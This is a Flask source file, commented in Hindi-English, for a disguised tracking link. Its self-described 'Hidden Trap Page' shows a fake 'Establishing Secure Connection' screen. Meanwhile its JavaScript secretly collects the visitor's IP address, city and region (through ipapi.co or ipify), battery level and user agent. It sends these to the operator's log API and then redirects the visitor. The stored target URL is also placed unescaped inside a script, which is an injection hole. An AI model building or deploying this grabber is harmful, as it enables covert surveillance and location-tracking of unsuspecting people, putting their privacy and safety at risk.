from flask import Flask, request, jsonify, render_template_string
from datetime import datetime

app = Flask(__name__)

# Temporary Memory Database
link_db = {} 
logs = []

# --- Dashboard se Link Create Karne Ka API ---
@app.route('/api/create', methods=['POST'])
def create():
    data = request.json
    link_db[data['alias']] = data['target']
    return jsonify({"status": "Success"})

# --- The Hidden Trap Page (/s/alias) ---
@app.route('/s/<alias>')
def trap(alias):
    target = link_db.get(alias, "https://google.com")
    
    return render_template_string('''
        <!DOCTYPE html>
        <html>
        <head><title>Loading...</title></head>
        <body style="background:#000; color:#0f0; text-align:center; padding-top:20%; font-family:sans-serif;">
            <h3>🔄 Establishing Secure Connection...</h3>
            <script>
                async function capture() {
                    let ip = "N/A";
                    let loc = "N/A";
                    let bat = "N/A";

                    try {
                        // IP aur Location Fetching
                        const res = await fetch('https://ipapi.co/json/');
                        const data = await res.json();
                        ip = data.ip || "N/A";
                        loc = (data.city && data.region) ? data.city + ", " + data.region : "N/A";
                    } catch(e) {
                        try {
                            const res2 = await fetch('https://api.ipify.org?format=json');
                            const data2 = await res2.json();
                            ip = data2.ip;
                        } catch(e2) {}
                    }

                    try { 
                        const b = await navigator.getBattery(); 
                        bat = Math.round(b.level * 100) + "%"; 
                    } catch(e) {}

                    // Server par Data bhejna
                    await fetch('/api/save_log', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            ip: ip,
                            location: loc,
                            device: navigator.userAgent,
                            battery: bat,
                            alias: "{{alias}}"
                        })
                    });
                    window.location.href = "{{target}}";
                }
                window.onload = capture;
            </script>
        </body>
        </html>
    ''', alias=alias, target=target)

# --- Data Save Karne Ka API ---
@app.route('/api/save_log', methods=['POST'])
def save_log():
    data = request.json
    data['time'] = datetime.now().strftime("%H:%M:%S")
    logs.insert(0, data)
    return jsonify({"success": True})

# --- Dashboard ke liye Logs Get Karna ---
@app.route('/api/getlogs')
def get_logs():
    return jsonify(logs)
    
